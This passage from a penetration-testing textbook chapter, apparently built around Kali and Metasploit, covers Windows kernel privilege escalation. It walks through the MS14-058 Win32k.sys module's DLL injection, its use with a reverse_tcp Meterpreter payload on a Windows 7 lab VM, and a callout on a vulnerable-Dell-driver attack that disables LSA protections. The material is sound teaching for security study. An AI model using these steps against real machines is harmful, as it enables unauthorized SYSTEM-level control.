<li><strong class="source-inline">library_path</strong> allows the module to find and load the exploit DLL from the attacker’s local disk. I hope your creative side has kicked in and you just realized that you could modify this module to point at any DLL you like.</li>
<li><strong class="source-inline">exploit_mem, offset = inject_dll_into_process()</strong> is the first slap across the target’s face. Note that <strong class="source-inline">inject_dll_into_process()</strong> is defined in the included <strong class="source-inline">ReflectiveDLLInjection</strong> module. This particular method takes the target process and the DLL’s local path as arguments and then returns an array with two values – the allocated memory address and the offset. Our module takes these returned values and stores them as <strong class="source-inline">exploit_mem</strong> and <strong class="source-inline">offset</strong> respectively.</li>
<li><strong class="source-inline">payload_mem = inject_into_process()</strong> is the second slap across the target’s face. <strong class="source-inline">payload.encoded</strong> is our shellcode (encoded as needed). This <a id="_idIndexMarker960"/>method returns only one value – the location of the shellcode in the target process’s memory. So, as you can see, at this point in our attack, <strong class="source-inline">payload_mem</strong> is now the location in our target’s memory where our shellcode begins.</li>
<li>If those first two instance methods for DLL injection were the slaps in the face, then <strong class="source-inline">process.thread.create(exploit_mem + offset, payload_mem)</strong> is our coup de grâce. We’re passing two parameters to <strong class="source-inline">process.thread.create()</strong>: first, <strong class="source-inline">exploit_mem</strong> with our offset added to it, and then the location of our shellcode in memory, <strong class="source-inline">payload_mem</strong>.</li>
</ul>
<p>So, why are we injecting a DLL into a process? The vulnerable kernel-mode driver, <strong class="source-inline">Win32k.sys</strong>, has more than 600 entry points that allow its functionality to be accessed; it handles a lot of useful tasks. As previously covered in this chapter, <strong class="source-inline">Win32k.sys</strong> is responsible for window management. <strong class="source-inline">Win32k.sys</strong> represents a necessary evil of this OS design – the blend of its needed power and accessibility to user-mode programs.</p>
<h1 id="_idParaDest-253"><a id="_idTextAnchor252"/>Practical kernel attacks with Kali</h1>
<p>We have enough background to sit down with Kali and fire off our attack at a vulnerable Windows target. At this point, you should fire up your Windows 7 VM. However, we’re doing two <a id="_idIndexMarker961"/>stages in this demonstration because the attack is local. So far, we’ve been examining attacks that get us in. This time, we’re already in. To the <a id="_idIndexMarker962"/>layperson, this sounds like the game is already won, but don’t forget that modern OSs are layered. There was a golden age when remote exploits landed you full <strong class="source-inline">SYSTEM</strong> privilege on a target Windows box. These days, this kind of remote exploit is a rare thing indeed. The far more likely scenario for today’s pen tester is that you’ll get some code executed, a shell pops up, and you feel all-powerful – until you realize that you only have the privileges of the lowly user of the computer who needs permission from the administrator to install software. You have your <em class="italic">foothold</em> – now, you need to escalate your privileges so that you can get some work done.</p>
<h2 id="_idParaDest-254"><a id="_idTextAnchor253"/>An introduction to privilege escalation</h2>
<p>The kernel attack described in this chapter is an example of privilege escalation – we’re attacking a flaw <a id="_idIndexMarker963"/>on the kernel side after allocating memory on the user side and injecting code into it. Accordingly, did you notice the big <a id="_idIndexMarker964"/>difference between the module we just reviewed and the remote attacks we examined in previous chapters? That’s right – there was no <a id="_idIndexMarker965"/>option for specifying a target IP address. This is a local attack; the only IP address you’ll define is the return of your reverse TCP connection to the handler.</p>
<p>To complete this demo, you’ll need to establish the foothold first! As we’re challenging you with a little self-study in order to follow along, we’re sticking with our old-school Windows 7 target.</p>
<p class="callout-heading">New OS, Old Problems – the Vulnerable OEM Driver</p>
<p class="callout">Once you’re comfortable with the theory and practice on the older Windows 7, start exploring modern kernel exploits with Metasploit. Check out the amazing post module called <strong class="source-inline">dell_memory_protect</strong>. A driver provided by Dell on their laptops called <strong class="source-inline">DBUtilDrv2.sys</strong> had a critical kernel-level write-what-where vulnerability in versions 2.5 and 2.7. Metasploit allows us to conduct the <em class="italic">bring your own vulnerable driver</em> attack on any Windows box, Dell or otherwise. The driver is easy to find online, so grab it, use the module to install it and disable LSA protections, and enjoy your <strong class="source-inline">SYSTEM</strong> access. Extra credit goes to those who tear apart the driver in IDA!</p>
<h2 id="_idParaDest-255"><a id="_idTextAnchor254"/>Escalating to SYSTEM on Windows 7 with Metasploit</h2>
<p>At this point, you’ve just received your Meterpreter connection back from the target – your <a id="_idIndexMarker966"/>foothold payload did the trick. We command <strong class="source-inline">getuid</strong> to see where we stand. Hmm – the username <strong class="source-inline">FrontDesk</strong> comes back. It doesn’t concern us that this user may or may not be an <a id="_idIndexMarker967"/>administrator; what’s important <a id="_idIndexMarker968"/>is that it isn’t <strong class="source-inline">SYSTEM</strong>, the absolute highest privilege possible. Even an administrator can’t get away with certain things – that account is still considered user mode.</p>
<p>I type <strong class="source-inline">background</strong> to send my Meterpreter session into the background so that I can work at the <strong class="source-inline">msf</strong> prompt. Although the multi/handler exploit is still in use, I can simply replace it. This time, we prepare our kernel attack with <strong class="source-inline">use exploit/windows/local/ms14_058_track_popup_menu</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer271">
<img alt="Figure 13.7 – Managing our foothold in Metasploit " height="326" src="image/Figure_13.7_B17616.jpg" width="939"/>
</div>
</div>
<p class="figure-caption">Figure 13.7 – Managing our foothold in Metasploit</p>
<p>In our screenshot examples, we aren’t displaying the options available to us; so, try that out with <strong class="source-inline">show options</strong>. When you establish the exploit and run this command, you’ll see the <strong class="source-inline">sessions</strong> option. This is specific to the Meterpreter sessions you’ve already established. Out in the field, you may have a foothold on dozens of machines; use this option to direct this attack at a specific session. At the <strong class="source-inline">msf</strong> prompt, use <strong class="source-inline">sessions -l</strong> to identify the session you need. <strong class="source-inline">sessions -i &lt;id&gt;</strong> will take you back into a session, so you can issue <strong class="source-inline">getuid</strong> to verify your privilege:</p>
<div>
<div class="IMG---Figure" id="_idContainer272">
<img alt="Figure 13.8 – Launching the attack inside our established session " height="167" src="image/Figure_13.8_B17616.jpg" width="736"/>
</div>
</div>
<p class="figure-caption">Figure 13.8 – Launching the attack inside our established session</p>
<p>This <a id="_idIndexMarker969"/>can be a little confusing to set up, as you’re just coming back from configuring your handler with a payload. You <a id="_idIndexMarker970"/>need to set the <a id="_idIndexMarker971"/>payload to be used by the kernel exploit. In my example, I’m issuing <strong class="source-inline">set payload windows/meterpreter/reverse_tcp</strong> to create a connect-back Meterpreter shellcode payload.</p>
<p>When you’re ready, fire off <strong class="source-inline">run</strong> and cross your fingers. This is an interesting attack; by its nature, the escalation could fail without killing your session. You’ll see everything on your screen suggesting a successful exploit, complete with a new Meterpreter session indicating that the shellcode was indeed executed – and yet, <strong class="source-inline">getuid</strong> will show the same user as before. This is why the module author put in the fingers-crossed status message, <strong class="source-inline">hopefully privileged</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer273">
<img alt="Figure 13.9 – Exploit complete – we are now SYSTEM " height="236" src="image/Figure_13.9_B17616.jpg" width="955"/>
</div>
</div>
<p class="figure-caption">Figure 13.9 – Exploit complete – we are now SYSTEM</p>
<p>In our demo, our Windows 7 Ultimate host was indeed vulnerable. We are now running as <strong class="source-inline">SYSTEM</strong>. Game over.</p>
<h1 id="_idParaDest-256"><a id="_idTextAnchor255"/>Summary</h1>
<p>In this chapter, we explored Windows kernel attacks. First, we reviewed the theory behind how the kernel works and what attackers try to leverage to pull off these attacks. Included in this theoretical discussion was a review of the low-level management role of the kernel and the security implications of these tasks, including scheduling interrupts. We picked a vulnerability type, the NULL or invalid pointer dereference vulnerability, and studied it in detail to understand how exploiting the kernel in this way gives the attacker full control of the system. We started with a review of pointers in C code and then examined the compiled assembly instructions to understand how the processor deals with the pointer concept. This review prepared us to understand what NULL pointers are and how they can cause problems in software. We then introduced a specific kernel-mode driver, <strong class="source-inline">Win32k.sys</strong>, and did a low-level review of its pointer flaw. We wrapped up this discussion with a review of the Metasploit exploit module, designed to attack this particular kernel-mode driver. Finally, we wrapped up the chapter with a hands-on demonstration of escalating privileges from an initial foothold by leveraging this attack against the vulnerable kernel-mode driver.</p>
<p>In the next chapter, we’ll wrap up the programming fundamentals with a review of fuzzing. In this book, you’ve already played around with fuzzing and may not even be aware of it. We’ll review the underlying principles and get hands-on with fuzz testing.</p>
<h1 id="_idParaDest-257"><a id="_idTextAnchor256"/>Questions</h1>
<p>Answer the following questions to test your knowledge of this chapter:</p>
<ol>
<li value="1">The ______ rests between the NT kernel and hardware.</li>
<li>A ______ kernel can interrupt kernel-mode threads; cooperative OSs must wait for the thread to finish.</li>
<li>In C, the ampersand operator before a variable references __________. </li>
<li>How many DWORDS fit into three quadwords?</li>
<li><strong class="source-inline">AX</strong> is the lower ________ of the 64-bit <strong class="source-inline">RAX</strong>.</li>
<li>It is not possible to dereference an invalid pointer – true or false?</li>
<li>My hexadecimal-to-decimal calculator says that <strong class="source-inline">ffffffff</strong> is equal to 4,294,967,295. Why does the <strong class="source-inline">xxxSendMessage()</strong> function think it’s <strong class="source-inline">-1</strong>?</li>
<li>What’s the difference between DLL injection and reflective DLL injection?</li>
</ol>
<h1 id="_idParaDest-258"><a id="_idTextAnchor257"/>Further reading</h1>
<p>For more information regarding the topics that were covered in this chapter, take a look at the following resources:</p>
<ul>
<li>Source code for HackSys Extreme Vulnerable Driver (<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver</a>)</li>
<li>The Windows SDK download for installing the debugger (<a href="https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk">https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk</a>)</li>
</ul>
</div>
</div></body></html>